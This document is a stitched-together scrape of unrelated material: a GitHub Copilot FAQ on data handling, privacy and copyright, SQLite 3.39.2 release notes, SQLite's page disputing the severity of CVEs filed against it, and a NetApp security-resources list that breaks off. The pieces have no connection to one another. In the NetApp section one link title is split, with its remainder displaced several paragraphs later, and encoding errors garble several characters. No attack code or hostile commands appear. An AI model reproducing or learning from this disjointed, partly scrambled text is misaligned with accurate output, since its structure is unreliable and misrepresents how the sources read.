GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

## SQLite Release 3.39.2 On 2022-07-21

**Prior changes from version 3.39.0 (2022-06-25):**

1. Add (long overdue) support for [RIGHT and FULL OUTER JOIN](../lang_select.html#rjoin).- Add new binary comparison operators [IS NOT DISTINCT FROM](../lang_expr.html#isdf) and [IS DISTINCT FROM](../lang_expr.html#isdf)
     that are equivalent to IS and IS NOT, respective, for compatibility with
     PostgreSQL and SQL standards.- Add a new return code (value "3") from the [sqlite3\_vtab\_distinct()](../c3ref/vtab_distinct.html)
       interface that indicates a query that has both DISTINCT and ORDER BY
       clauses.- Added the [sqlite3\_db\_name()](../c3ref/db_name.html) interface.- The unix os interface resolves all symbolic links in database
           filenames to create a canonical name for the database before the
           file is opened.
           If the [SQLITE\_OPEN\_NOFOLLOW](../c3ref/c_open_autoproxy.html) flag is used with [sqlite3\_open\_v2()](../c3ref/open.html)
           or similar, the open will fail if any element of the path is a
           symbolic link.- Defer materializing views until the materialization
             is actually needed, thus avoiding unnecessary work if the materialization turns
             out to never be used.- The [HAVING clause](../lang_select.html#resultset) of a [SELECT statement](../lang_select.html) is now allowed on any aggregate query,
               even queries that do not have a [GROUP BY clause](../lang_select.html#resultset).- Many [microoptimizations](../cpu.html#microopt) collectively reduce CPU cycles by about 2.3%.

**Prior changes from version 3.39.1 (2022-07-13):**

1. Fix an incorrect result from a query that uses a view that contains a compound
   SELECT in which only one arm contains a RIGHT JOIN and where the view is not
   the first FROM clause term of the query that contains the view.
   [forum post 174afeae5734d42d](https://sqlite.org/forum/forumpost/174afeae5734d42d).- Fix some harmless compiler warnings.- Fix a long-standing problem with [ALTER TABLE RENAME](../lang_altertable.html#altertabrename) that can only arise
       if the [sqlite3\_limit](../c3ref/limit.html)([SQLITE\_LIMIT\_SQL\_LENGTH](../c3ref/c_limit_attached.html#sqlitelimitsqllength)) is set to a very small value.- Fix a long-standing problem in [FTS3](../fts3.html) that can only arise when compiled with
         the [SQLITE\_ENABLE\_FTS3\_PARENTHESIS](../compile.html#enable_fts3_parenthesis) compile-time option.- Fix the build so that is works when the [SQLITE\_DEBUG](../compile.html#debug) and
           [SQLITE\_OMIT\_WINDOWFUNC](../compile.html#omit_windowfunc) compile-time options are both provided at the
           same time.- Fix the initial-prefix optimization for the [REGEXP](../lang_expr.html#regexp) extension so that it works
             correctly even if the prefix contains characters that require a 3-byte UTF8
             encoding.- Enhance the [sqlite\_stmt](../stmt.html) virtual table so that it buffers all of its output.

**Changes in this specific patch release, version 3.39.2 (2022-07-21):**

1. Fix a performance regression in the query planner associated with rearranging
   the order of FROM clause terms in the presences of a LEFT JOIN.- Apply fixes for CVE-2022-35737, Chromium bugs 1343348 and 1345947,
     [forum post 3607259d3c](https://sqlite.org/forum/forumpost/3607259d3c), and
     other minor problems discovered by internal testing.

     **Hashes:**- SQLITE\_SOURCE\_ID: 2022-07-21 15:24:47 698edb77537b67c41adc68f9b892db56bcf9a55e00371a61420f3ddd668e6603- SHA3-256 for sqlite3.c: bffbaafa94706f0ed234f183af3eb46e6485e7e2c75983173ded76e0da805f11

# 1. Executive Summary

* CVEs about SQLite probably do not apply to your use of SQLite.
* All historical vulnerabilities reported against SQLite require at least
  one of these preconditions:

  1. The attacker can submit and run arbitrary SQL statements.
  2. The attacker can submit a maliciously crafted database file to the
     application that the application will then open and query.
* Few real-world applications meet either of these preconditions, and hence
  few real-world applications are vulnerable, even if they use older
  and unpatched versions of SQLite.
* The SQLite development team fixes bugs promptly,
  usually within hours of discovery. New releases of SQLite
  are issued if the bug seems likely to impact real-world
  applications.
* Grey-hat hackers are rewarded based on the number and severity of
  CVEs that they write. This results in a proliferation of CVEs that
  have minor impact, or no impact at all, but which make
  exaggerated impact claims.
* Very few CVEs written about SQLite are real vulnerabilities in the
  sense that they do not give any new capabilities to an attacker.
  Consider:

  1. Almost all CVEs written against SQLite require the ability to
     inject and run arbitrary SQL.
  2. The advertised consequence of most CVEs is "denial of service",
     typically by causing a crash through a NULL pointer dereference or
     a division by zero, or similar.
  3. But if an attacker can already run
     arbitrary SQL, they do not need a bug to cause a denial of service.
     There are plenty of perfectly legal and valid SQL statements
     that will consume unlimited CPU, memory, and disk I/O in order
     to create a denial-of-service without requiring help from bugs.
  4. Hence, the mere fact that an attacker has a way to inject and run
     arbitrary SQL is in and of itself a denial-of-service attack. That
     the arbitrary SQL might also tickle a bug in SQLite and cause a
     crash is not a new vulnerability.
* The SQLite developers do not write CVEs. Any CVEs you find on
  SQLite are generated by third-parties, often without any input from the
  core developers. A common scenario is that someone will report a bug in
  SQLite, which will promptly be fixed, then weeks later a CVE for that bug will
  appear, unbeknownst to the developers.
* You should not assume that a CVE about
  SQLite contains authoritative information.
  CVEs often contain inaccuracies.
  The SQLite developers have attempted to add clarifications and
  corrections to CVEs about SQLite.

# 2. About CVEs

CVEs ("Common Vulnerabilities and Exposures") are reports of software
bugs that might allow a system to be hacked. The idea
behind CVEs is sound. They provide a common naming scheme whereby
software bugs that might compromise information security can be easily
tracked.

While the original idea behind CVEs is sound, the current processes for
creating and managing CVEs are inadequate. There are countless grey-hat
hackers running fuzzers against a wide-variety of open-source software
products (SQLite as well as many others) and writing up CVEs against
any problems they find. The grey-hats are rewarded, sometimes with
prestige and sometimes financially, by the number and severity of
the CVEs they write. This incentive results in a proliferation
of CVEs which are often not well-vetted and which can have exaggerated
impact claims. The quality-control procedures for CVEs are unable
to cope with this flood of inputs, making it difficult to correct
exaggerated, misleading, omitted, or inaccurate claims.

This is not to say that CVEs are useless. CVEs do still (mostly)
report actual bugs. But in most cases the bugs are not true vulnerabilities,
in the sense that they do not contribute to data loss or compromise
in and of themselves.
It is good that bugs are reported and fixed. But not every bug is
accessible from every application. In the case of SQLite, most of the
bugs reported by CVEs are inaccessible in most applications. Upgrading
to the latest version of SQLite is always a good plan, but it need not
be an emergency just because an anonymous grey-hat on the internet
wrote up a CVE.

## 2.1. A separate SQL injection vulnerability is usually required

Other C-libraries that process complex structured inputs will
routinely be asked to deal with unvetted inputs from untrusted
sources. Libraries like libjpeg, or libzip, or OpenSSL are
handed input streams that come directly from potentially hostile
agents.

But database engines like SQLite are usually not this way.
The SQL scripts that are passed into SQLite come from the
(trusted) application itself, not from an attacker. Sometimes
applications contain bugs by which an external attacker can
trick the application into sending SQL of the attackers design
into the database engine. This is a separate bug in the
application called an
[SQL Injection
vulnerability](https://en.wikipedia.org/wiki/SQL_injection). Since SQL text is executable code, an
SQL Injection vulnerability is actually a special case of a
[Remote
Code Execution (RCE) vulnerability](https://en.wikipedia.org/wiki/Arbitrary_code_execution). An SQL Injection is perhaps not
quite as bad as other kinds of RCEs because,
while SQL is a powerful language, it is not as convenient
for crafting an exploit as Python or shell script or raw machine code.
Nevertheless, an SQL Injection is a serious problem.

Most CVEs written about SQLite assume that the attacker is
able to run arbitrary SQL scripts in SQLite. In most applications,
this means that there must first be an SQL Injection vulnerability
that allows the attacker to inject the malicious SQL.

A few applications do allow untrusted SQL scripts received from
potentially hostile agents to be run direct in SQLite. The main
example of this is the Chrome and Safari web browsers, which allow
an anonymous web page to run SQL using the WebSQL feature of Javascript.
This is done inside a sandbox with tightly controlled constraints on
resources, lest the SQL script try to soak up all available memory
or CPU cycles in a denial-of-service attack. Chrome and Safari
have the infrastructure in place to allow a hostile agent to run
code which does not harm or compromise the rest of the machine.
They have to, as they also run Javascript which could, if not
tightly controlled, do even more damage than unrestrained SQL.
Apart from Chrome and Safari, no applications known to the
SQLite developers deliberately allows an anonymous remote agent
to run arbitrary SQL text.

However, most CVEs written against SQLite flippantly assume
that an attacker is free to run any arbitrary SQL in the database
engine. So to a good approximation, this means most CVEs
written against SQLite really only apply to SQLite as it is
used in Chrome and Safari. Or, in other words, most CVEs
for SQLite do not apply to you unless you are one of the
developers of Chrome or Safari.

## 2.2. Defense Against Dark Arts

Most applications can use SQLite without having to worry about
bugs in obscure SQL inputs. If the application controls
the SQL, and the application is not deliberately trying to break
SQLite, then everything should just work.
It is not necessary to have the latest patched version of SQLite.
Any older version should work just fine.

However, there are some occasions where an application does need
to be able to safely run untrusted SQL. The SQLite developers work hard
to make SQLite safe for this purpose, though there are occasional
slip-ups. It is good to keep up-to-date with the latest patches
in this case. The separate [defense against dark arts](security.html) document
contains additional suggestions that can help prevent zero-day
attacks in cases where SQLite is given inputs that come directly
from untrusted sources.

## 2.3. The SQLite Developer Policy Toward CVEs

SQLite developers fix all bugs in SQLite as soon as they are reported,
usually within a few hours. The fixes are immediately available on the
[public SQLite source tree](https://sqlite.org/src/timeline).
If a bug seems like it might cause problems for existing applications,
a new patch release for SQLite will be issued.

However, the SQLite developers do not track CVEs. There are
various reasons for this:

1. The developers often do not find out about CVEs until long after the
   bug is fixed. You can see this by the fact that many CVEs reference the
   bug fix in their initial report.
2. CVEs are a low-quality source of information about bugs in SQLite
   that are likely to affect most applications.
3. Almost all bugs reported by CVEs are just bugs and not
   true vulnerabilities. Claiming that they are vulnerabilities is
   stretching the meaning of the word "vulnerability" and the SQLite
   developers do not wish to participate in that deception.
4. The developers have no editorial influence on the content of CVEs,
   and they do not like to be controlled by groups in which they have
   no voice.

# 3. Status Of Recent SQLite CVEs

Though the SQLite developers do not consider CVEs to be a reliable
source of information about bugs in SQLite, they recognize that many
groups, and especially small teams working at the bottom of tall
bureaucracies, sometimes need to track CVEs, whether they are useful
or not. To aid in this chore, the following table of recent CVEs
affecting SQLite is provided.

If you notice new CVEs associated with SQLite that are not in
the table below, please bring them to the attention of the developers
on the [SQLite Forum](https://sqlite.org/forum/about) so they can
be added.

| CVE Number | Fix | Comments |
| --- | --- | --- |
| [CVE-2024-0232](https://nvd.nist.gov/vuln/detail/CVE-2024-0232) | [3.43.2](releaselog/3_43_2.html)(2023-10-10) | An attacker that can inject arbitrary SQL statements into an application might be able to provoke a use-after-free bug in SQLite's JSON parser that can (in theory) lead to an application crash and denial of service. See [forum thread b25edc1d4662](https://sqlite.org/forum/forumpost/b25edc1d4662ebca) for the bug report. |
| [CVE-2023-32697](https://nvd.nist.gov/vuln/detail/CVE-2023-32697) | Not a bug in SQLite | This is a bug in the SQLite JDBC library, which is a wrapper library that provides access to SQLite from Java. SQLite JDBC is created and maintained independently from SQLite. Despite the use of "SQLite" in the name, the SQLite JDBC library is not affiliated with the SQLite project in any way. The vulnerability identified by this CVE is in the separate SQLite JDBC wrapper library and does not affect SQLite itself. |
| [CVE-2023-39939](https://nvd.nist.gov/vuln/detail/CVE-2023-39939) | Not a bug in SQLite | This is not a bug in SQLite. This is an [SQL injection bug](https://en.wikipedia.org/wiki/SQL_injection) in an application (LuxCal Web Calendar) that links against SQLite. Even though this CVE is not about SQLite, "SQLite" is mentioned in the description and so we list it here. |
| [CVE-2023-39543](https://nvd.nist.gov/vuln/detail/CVE-2023-39543) | Not a bug in SQLite | This is not a bug in SQLite. This is an [XSS vulnerability](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting) in a separate application (LuxCal Web Calendar) that links against SQLite. The bug is in the application, not in SQLite. However "SQLite" is mentioned in the description and so we list it here. |
| [CVE-2023-7104](https://nvd.nist.gov/vuln/detail/CVE-2023-7104) | [3.43.1](releaselog/3_43_1.html)(2023-09-11) | This is a bug in the [session extension](sessionintro.html) of SQLite, not in the SQLite core. This bug is only reachable by applications that recompile SQLite using the [-DSQLITE\_ENABLE\_SESSION](compile.html#enable_session) compile-time option and then use the Session C-language APIs to process a [changeset](sessionintro.html#changeset) that has been subtly corrupted by an adversary. So this bug probably does not apply to you. See [forum post f935c4708dd528d9](https://sqlite.org/forum/forumpost/f935c4708dd528d9) for additional information. |
| [CVE-2022-46908](https://nvd.nist.gov/vuln/detail/CVE-2022-46908) | Not a bug in the core SQLite library | This is a bug in the --safe command-line option of the [command-line shell](cli.html) program that is available for accessing SQLite database files. The bug does not exist in the SQLite library. Nor is it an issue for the [CLI](cli.html) as long as the user does not depend on the --safe option. It is not serious. It is debatable whether or not this is a security issue. |
| [CVE-2022-38627](https://nvd.nist.gov/vuln/detail/CVE-2022-38627) | Not a bug in SQLite | This is not a bug in SQLite. This is an [SQL injection bug](https://en.wikipedia.org/wiki/SQL_injection) in a specific PHP application. In other words, the bug is in the PHP application code, not in SQLite. Even though this CVE is not about SQLite, "SQLite" is mentioned in the publicity about the bug and so we list it here. |
| [CVE-2022-35737](https://nvd.nist.gov/vuln/detail/CVE-2022-35737) | [3.39.2](releaselog/3_39_2.html)(2022-07-21) | This bug is an array-bounds overflow. The bug is only accessible when using some of the C-language APIs provided by SQLite. The bug cannot be reached using SQL nor can it be reached by providing SQLite with a corrupt database file. The bug only comes up when very long string inputs (greater than 2 billion bytes in length) are provided as arguments to a few specific C-language interfaces, and even then only under special circumstances. |
| [CVE-2022-24854](https://nvd.nist.gov/vuln/detail/CVE-2022-24854) | Not a bug in SQLite | This CVE describes a bug in an application that uses SQLite, not in SQLite itself. SQLite is doing everything correctly. The application grants users the ability to run SQL statements, using SQLite, that can leak or change information that those users should not normally have access to. This is purely an application bug. It does not describe a malfunction or vulnerability in SQLite. |
| [CVE-2022-21227](https://nvd.nist.gov/vuln/detail/CVE-2022-21227) | Not a bug in SQLite | This CVE describes a bug in a third-party packages that provides a binding for SQLite to Node.js. The bug reported is in the third-party Node.js binding, not in SQLite itself. Do not be confused by the use of the word "SQLite" in the ambiguously-worded CVE description. |
| [CVE-2021-45346](https://nvd.nist.gov/vuln/detail/CVE-2021-45346) | Not a bug in SQLite | This CVE is misinformation. See the discussion around [SQLite forum post 53de8864ba114bf](https://sqlite.org/forum/forumpost/53de8864ba114bf6). |
| [CVE-2021-42169](https://nvd.nist.gov/vuln/detail/CVE-2021-42169) | Not a bug in SQLite | This CVE has nothing whatsoever to do with SQLite. It is about a bug in application that happens to use SQLite. Since SQLite is mentioned in the CVE description, the CVE is included here to emphasize that this is not an SQLite bug. |
| [CVE-2021-36690](https://nvd.nist.gov/vuln/detail/CVE-2021-36690) | Not a bug in the core SQLite library | This bug is not in the SQLite core library, but rather in an [experimental extension](https://www.sqlite.org/src/dir?ci=trunk&name=ext/expert) that is used to implement the [.expert command](cli.html#expert) in the [CLI](cli.html). The code that contains the bug does not appear in [standard SQLite builds](amalgamation.html), though it is included in the [sqlite3.exe command-line tool](cli.html). Applications must link against the extra source code files that implement the extension and take other deliberate actions to activate the extension before the troublesome code can be run. For the rare application that uses the troublesome extension, the consequence of this bug is that malicious SQL can cause a NULL pointer deference and denial of service. [(details)](https://sqlite.org/forum/info/78165fa25061742f) |
| [CVE-2021-31239](https://nvd.nist.gov/vuln/detail/CVE-2021-31239) | Not a bug in the core SQLite library | This is a bug in the [CLI](cli.html). It allows a user with unrestricted shell access to cause a denial-of-service. Of course, there are a million easier ways for a user with unrestricted shell access to cause far worse mischief. The problem was in the [appendvfs extension](https://sqlite.org/src/doc/trunk/ext/misc/appendvfs.c) which is not a part of standard SQLite. [(details)](https://www.sqlite.org/src/info/04f6439f4d9b9b1f) |
| [CVE-2021-28305](https://nvd.nist.gov/vuln/detail/CVE-2021-28305) | Not a bug in SQLite | This is not a bug in SQLite. The bug is in a third-party application that uses SQLite. SQLite is mentioned by name in the CVE description, however, so we have included the CVE in the list. |
| [CVE-2021-23404](https://nvd.nist.gov/vuln/detail/CVE-2021-23404) | Not a bug in SQLite | This is not a bug in SQLite. The bug is in a third-party application that uses SQLite and includes "sqlite" in its name. This CVE is included on the list because it mentions SQLite even though the bug has nothing to do with SQLite. |
| [CVE-2021-20227](https://nvd.nist.gov/vuln/detail/CVE-2021-20227) | [3.34.1](releaselog/3_34_1.html)(2021-01-20) | Malicious SQL statement causes read-after-free. No harm can come of this particular read-after-free instance, as far as anyone knows. The bug is undetectable without a memory sanitizer. The CVE claims that this bug is an RCE - a Remote Code Execution vulnerability, but that claim is incorrect. The RCE claim is misinformation. [(details)](https://sqlite.org/src/info/30a4c323650cc949) |
| [CVE-2021-20223](https://nvd.nist.gov/vuln/detail/CVE-2021-20223) | [3.34.0](releaselog/3_34_0.html)(2020-12-01) | The problem identified by this CVE is not a vulnerability. It is a malfunction. A coding error causes [FTS5](fts5.html) to sometimes return inconsistent and incorrect results under obscure circumstances, but no memory errors occur. [(details)](https://sqlite.org/src/info/b7b7bde9b7a03665) |
| [CVE-2020-15358](https://nvd.nist.gov/vuln/detail/CVE-2020-15358) | [3.32.3](releaselog/3_32_3.html)(2020-06-18) | Malicious SQL statement causes a read past the end of a heap buffer. [(details)](https://sqlite.org/src/info/8f157e8010b22af0) |
| [CVE-2020-13871](https://nvd.nist.gov/vuln/detail/CVE-2020-13871) | [3.32.3](releaselog/3_32_3.html)(2020-06-18) | Malicious SQL statement causes a read-only use-after-free memory error. [(details)](https://sqlite.org/src/info/c8d3b9f0a750a529) |
| [CVE-2020-13632](https://nvd.nist.gov/vuln/detail/CVE-2020-13632) | [3.32.0](releaselog/3_32_0.html)(2020-05-22) | Malicious SQL statement causes a read of a NULL pointer in the [matchinfo()](fts3.html#matchinfo) SQL function of the [FTS3](fts3.html) extension, resulting in denial of service. [(details)](https://sqlite.org/src/info/a4dd148928ea65bd) |
| [CVE-2020-13631](https://nvd.nist.gov/vuln/detail/CVE-2020-13631) | [3.32.0](releaselog/3_32_0.html)(2020-05-22) | Malicious SQL statement (an ALTER TABLE that tries to rename a [virtual table](vtab.html) into one of its own [shadow tables](vtab.html#xshadowname)) causes an infinite loop and denial of service. [(details)](https://sqlite.org/src/info/eca0ba2cf4c0fdf7) |
| [CVE-2020-13630](https://nvd.nist.gov/vuln/detail/CVE-2020-13630) | [3.32.0](releaselog/3_32_0.html)(2020-05-22) | Malicious SQL statement causes a read-only use-after-free, possibly resulting in an incorrect output from the [snippet()](fts3.html#snippet) SQL function of the [FTS3](fts3.html) extension. There is no known way to exfiltrate data or crash the application using this bug. [(details)](https://sqlite.org/src/info/0d69f76f0865f962) |

## Security Resources

With the ever prevalent threats that span todayâs landscape, NetApp continues
to derive and provide security solutions across the portfolio. Links to
security resources are found below. As always, stay tuned because just like the
threat landscape, these resources are ever changing and being updated!

#### Products and Solutions

The product and solutions resources provide guidance, recommendations, and best
practices with regard to security elements and configurations amongst the
NetApp portfolio.

##### ONTAP

[ONTAP 9 Security Datasheet](http://www.netapp.com/us/media/ds-3846.pdf) - The
ONTAP 9 Security Datasheet provides a comprehensive list of security features
and functions available in ONTAP 9 - So if the question is, âwhat are all the
security features/functions in ONTAP 9?â, This is your resource!

[Security Hardening Guide for NetApp ONTAP
9](https://www.netapp.com/us/media/tr-4569.pdf) - We humbly refer to the
Security Hardening Guide for NetApp ONTAP 9 as your key resource when it comes
to answering the question, âhow do I deploy ONTAP 9 in the most secure
fashion?â. The hardening guide provides the recommended commands and configs
necessary to enable ONTAP 9 in the most secure configuration.

[ONTAP 9 Encryption Power

* When it comes to understanding the configuration and management details of NSE and NVE,
  including deployment, certificates, onboard key management and more, the Power
  Guide is the key resource!

[ONTAP 9 Network Management
Guide](https://docs.netapp.com/us-en/ontap/pdfs/sidebar/Network_management.pdf) - While
this guide provides vast elements surrounding ONTAP networking (IPv4, v6,
IPSpaces, and more), it also captures some key security elements such as
managing SVMs, protocol restrictions and firewall configuration in addition to
control plane elements such as DNS, SNMP, FIPS configuration, and MTU details.
The Network Management Guide also shows list of ports used in ONTAP, also
listed in the hardening guide.

[ONTAP 9 Manage administrator authentication and RBAC with the
CLI](https://docs.netapp.com/us-en/ontap/authentication/)

* You can enable login accounts for ONTAP cluster administrators and storage virtual machine (SVM) administrators.

Encryption](http://www.netapp.com/us/media/ds-3898.pdf) - When it comes to
encryption at rest there are many questions about the capabilities. The NSE and
NVE Datasheet seeks to quell such questions by providing a comprehensive
understanding of what NSE is, what NVE is, use cases, and how they can be
leveraged individually or together for a true dual/double encryption solution.

[NetApp Storage Encryption
Datasheet](http://www.netapp.com/us/media/ds-3213-en.pdf) - The NSE Datasheet
provides a holistic overview of the NSE solution and use cases. If you have
ever wondered what NSE is, what we mean by self encrypting drives, or what
encryption algorithm is in use, this is the resource for you!

[The NetApp Solution for
Ransomware](http://www.netapp.com/us/media/tr-4572.pdf) - Ransomware wages war
on every environment. Being the custodians of one of the worldâs most valuable
